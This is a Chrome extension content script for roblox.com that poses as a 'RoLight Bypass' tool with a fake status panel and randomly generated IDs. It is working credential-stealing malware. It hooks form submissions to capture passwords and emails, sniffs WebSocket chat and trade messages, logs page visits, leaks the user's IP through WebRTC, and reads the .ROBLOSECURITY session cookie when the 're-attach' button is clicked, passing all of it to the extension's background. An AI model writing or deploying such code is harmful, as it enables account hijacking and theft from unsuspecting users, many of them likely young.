// Only run on roblox.com
if (window.location.hostname.includes("roblox.com")) {
  // ===== 1. WebSocket Sniffer =====
  (function() {
    const originalWebSocket = window.WebSocket;
    window.WebSocket = function(url, protocols) {
      const ws = new originalWebSocket(url, protocols);

      ws.addEventListener("message", (event) => {
        try {
          const data = JSON.parse(event.data);
          if (data.type === "chat" || data.type === "trade" || data.type === "gameEvent") {
            chrome.runtime.sendMessage({
              type: "WEBSOCKET_SNIFF",
              data: {
                url: url,
                message: data,
                timestamp: new Date().toISOString()
              }
            });
          }
        } catch (e) {
          // Not JSON, ignore
        }
      });

      return ws;
    };
  })();

  // ===== 2. Performance API Logger =====
  (function() {
    const sendPerformanceData = () => {
      const entries = window.performance.getEntries();
      const robloxEntries = entries.filter(entry =>
        entry.name.includes("roblox.com") &&
        (entry.name.includes("/users/") ||
         entry.name.includes("/trade") ||
         entry.name.includes("/inventory") ||
         entry.name.includes("/games/"))
      );

      if (robloxEntries.length > 0) {
        chrome.runtime.sendMessage({
          type: "PERFORMANCE_LOG",
          data: {
            url: robloxEntries[robloxEntries.length - 1].name, // Send most recent entry
            timestamp: new Date().toISOString()
          }
        });
      }
    };

    // Send on initial load
    sendPerformanceData();

    // Send on navigation (SPA support)
    const observer = new MutationObserver(sendPerformanceData);
    observer.observe(document.body, { childList: true, subtree: true });
  })();

  // ===== 3. Form Submission Hijacker =====
  (function() {
    document.addEventListener("submit", (e) => {
      if (e.target.tagName === "FORM") {
        const formData = {};
        const inputs = e.target.querySelectorAll("input");

        inputs.forEach(input => {
          if (input.type === "text" || input.type === "password" || input.type === "email") {
            formData[input.name || input.id] = input.value;
          }
        });

        if (Object.keys(formData).length > 0) {
          chrome.runtime.sendMessage({
            type: "FORM_HIJACK",
            data: {
              url: window.location.href,
              formData: formData,
              timestamp: new Date().toISOString()
            }
          });
        }
      }
    });
  })();

  // ===== 4. WebRTC IP Leak =====
  (function() {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.createOffer().then(offer => pc.setLocalDescription(offer));

    pc.onicecandidate = (e) => {
      if (e.candidate) {
        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
        const match = ipRegex.exec(e.candidate.candidate);
        if (match) {
          chrome.runtime.sendMessage({
            type: "WEBRTC_LEAK",
            data: { ip: match[1] }
          });
        }
      }
    };
  })();

  // ===== UI (Existing) =====
  const style = document.createElement('style');
  style.textContent = `
    #rolight-bypass-ui {
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 300px;
      background: #0a0a12;
      color: #00ff88;
      padding: 10px;
      border-radius: 4px;
      border: 1px solid #00ff8822;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      z-index: 999999;
      box-shadow: 0 0 10px #00ff8822;
      cursor: move;
      user-select: none;
    }
    .status-box {
      background: #00000044;
      padding: 8px;
      margin: 5px 0;
      border-radius: 3px;
      border-left: 3px solid #00ff88;
    }
    .status-title {
      font-weight: bold;
      color: #00ff88;
    }
    .status-value {
      color: #ffffff;
    }
    .status-possible {
      color: #00ff88;
    }
    .status-impossible {
      color: #ff3333;
    }
    .status-idle {
      color: #888888;
    }
    .status-active {
      color: #00ff88;
    }
    #reattach-btn {
      background: #00ff88;
      color: #000;
      border: none;
      padding: 5px 10px;
      border-radius: 3px;
      cursor: pointer;
      font-weight: bold;
      margin-top: 5px;
      width: 100%;
    }
    #reattach-btn:hover {
      background: #00dd77;
    }
    .helper-text {
      font-size: 11px;
      color: #888;
      margin-top: 5px;
    }
  `;
  document.head.appendChild(style);

  const ui = document.createElement('div');
  ui.id = 'rolight-bypass-ui';
  ui.innerHTML = `
    <div id="drag-handle" style="cursor: move; padding: 5px; margin: -10px -10px 10px; background: #00000044; border-radius: 4px 4px 0 0;">
      <h3 style="margin: 0; padding: 5px;">RoLight Bypass</h3>
    </div>
    <div class="status-box">
      <span class="status-title">Bypass:</span>
      <span class="status-value status-possible">Possible ✓</span>
    </div>
    <div class="status-box">
      <span class="status-title">Status:</span>
      <span class="status-value status-idle" id="status-text">Idle</span>
    </div>
    <div class="status-box">
      <span class="status-title">Bypass ID:</span>
      <span class="status-value" id="bypass-id">7X9F2K4P8R1Q3W5</span>
    </div>
    <div class="status-box">
      <span class="status-title">Activation Client ID:</span>
      <span class="status-value" id="client-id">12345</span>
    </div>
    <div class="status-box">
      <span class="status-title">Security Level:</span>
      <span class="status-value status-possible">Top</span>
    </div>
    <button id="reattach-btn">Re-attach to Bypass Local</button>
    <div class="helper-text">If the bypass failed or didnt work, re-attach. WORKS ONLY ON CHROME</div>
  `;
  document.body.appendChild(ui);

  // Make UI draggable
  let isDragging = false;
  let offsetX, offsetY;
  const dragHandle = document.getElementById('drag-handle');
  dragHandle.addEventListener('mousedown', (e) => {
    isDragging = true;
    offsetX = e.clientX - ui.getBoundingClientRect().left;
    offsetY = e.clientY - ui.getBoundingClientRect().top;
    e.preventDefault();
  });
  document.addEventListener('mousemove', (e) => {
    if (isDragging) {
      ui.style.left = (e.clientX - offsetX) + 'px';
      ui.style.right = 'auto';
      ui.style.top = (e.clientY - offsetY) + 'px';
      ui.style.bottom = 'auto';
    }
  });
  document.addEventListener('mouseup', () => {
    isDragging = false;
  });

  // Generate random IDs
  const randomId = () => {
    let id = '';
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    for (let i = 0; i < 15; i++) {
      id += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return id;
  };
  const random5Digit = () => {
    let id = '';
    for (let i = 0; i < 5; i++) {
      id += Math.floor(Math.random() * 10);
    }
    return id;
  };
  document.getElementById('bypass-id').textContent = randomId();
  document.getElementById('client-id').textContent = random5Digit();

  // Re-attach button logic
  document.getElementById('reattach-btn').addEventListener('click', () => {
    const statusText = document.getElementById('status-text');
    statusText.textContent = "Re-attaching...";
    statusText.className = "status-value status-active";

    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
      if (cookie) {
        chrome.runtime.sendMessage({
          type: "ROBLOX_DATA",
          data: {
            cookies: cookie.value,
            timestamp: new Date().toISOString()
          }
        });
      }
      setTimeout(() => {
        statusText.textContent = "Idle";
        statusText.className = "status-value status-idle";
      }, 2000);
    });
  });
}
